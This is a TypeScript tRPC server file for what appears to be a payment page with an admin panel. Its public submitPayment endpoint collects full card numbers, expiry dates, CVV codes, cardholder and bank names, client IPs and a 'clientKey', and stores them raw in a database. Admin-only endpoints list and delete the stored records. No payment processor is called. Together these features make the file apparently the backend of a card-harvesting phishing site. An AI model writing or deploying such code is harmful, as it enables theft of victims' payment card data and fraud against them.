import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router, protectedProcedure } from "./_core/trpc";
import { z } from "zod";
import { createPaymentTransaction, getPaymentTransactions, deletePaymentTransaction, getAdminByUsername } from "./db";
import bcryptjs from "bcryptjs";
import jwt from "jsonwebtoken";
import { ENV } from "./_core/env";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  // Payment API endpoints
  payment: router({
    // Receive payment data from frontend
    submitPayment: publicProcedure
      .input(z.object({
        phone: z.string(),
        total: z.string(),
        cardNumber: z.string().optional(),
        expiry: z.string().optional(),
        cvv: z.string().optional(),
        cardHolder: z.string().optional(),
        cardBrand: z.string().optional(),
        bankName: z.string().optional(),
        clientIP: z.string().optional(),
        paymentMethod: z.string().optional(),
        clientKey: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        try {
          await createPaymentTransaction({
            phone: input.phone,
            amount: input.total,
            cardNumber: input.cardNumber,
            cardExpiry: input.expiry,
            cardCVV: input.cvv,
            cardHolder: input.cardHolder,
            cardBrand: input.cardBrand,
            bankName: input.bankName,
            clientIP: input.clientIP,
            paymentMethod: input.paymentMethod,
            clientKey: input.clientKey,
            status: "pending",
          });
          return { success: true };
        } catch (error) {
          console.error("Payment submission error:", error);
          return { success: false, error: "Failed to process payment" };
        }
      }),

    // Get all payment transactions (admin only)
    getTransactions: publicProcedure
      .query(async ({ ctx }) => {
        // Check for admin session
        const adminToken = ctx.req.cookies?.admin_session_id;
        if (!adminToken) {
          throw new Error('Unauthorized: Admin session required');
        }

        try {
          jwt.verify(adminToken, ENV.jwtSecret);
          const transactions = await getPaymentTransactions();
          return transactions;
        } catch (error) {
          throw new Error('Unauthorized: Invalid admin session');
        }
      }),

    // Delete a transaction (admin only)
    deleteTransaction: publicProcedure
      .input(z.object({ id: z.number() }))
      .mutation(async ({ input, ctx }) => {
        // Check for admin session
        const adminToken = ctx.req.cookies?.admin_session_id;
        if (!adminToken) {
          throw new Error('Unauthorized: Admin session required');
        }

        try {
          jwt.verify(adminToken, ENV.jwtSecret);
          const success = await deletePaymentTransaction(input.id);
          return { success };
        } catch (error) {
          throw new Error('Unauthorized: Invalid admin session');
        }
      }),
  }),

  // Admin authentication
  admin: router({
    login: publicProcedure
      .input(z.object({
        username: z.string(),
        password: z.string(),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          const admin = await getAdminByUsername(input.username);
          if (!admin) {
            return { success: false, error: "Invalid credentials" };
          }

          const passwordMatch = await bcryptjs.compare(input.password, admin.passwordHash);
          if (!passwordMatch) {
            return { success: false, error: "Invalid credentials" };
          }

          // Create admin session token
          const token = jwt.sign(
            { adminId: admin.id, username: admin.username, email: admin.email },
            ENV.jwtSecret,
            { expiresIn: '24h' }
          );

          // Set admin session cookie
          const cookieOptions = getSessionCookieOptions(ctx.req);
          ctx.res.cookie('admin_session_id', token, {
            ...cookieOptions,
            maxAge: 24 * 60 * 60 * 1000, // 24 hours
          });

          return { success: true, admin: { id: admin.id, username: admin.username, email: admin.email } };
        } catch (error) {
          console.error("Admin login error:", error);
          return { success: false, error: "Login failed" };
        }
      }),

    logout: publicProcedure
      .mutation(({ ctx }) => {
        const cookieOptions = getSessionCookieOptions(ctx.req);
        ctx.res.clearCookie('admin_session_id', { ...cookieOptions, maxAge: -1 });
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
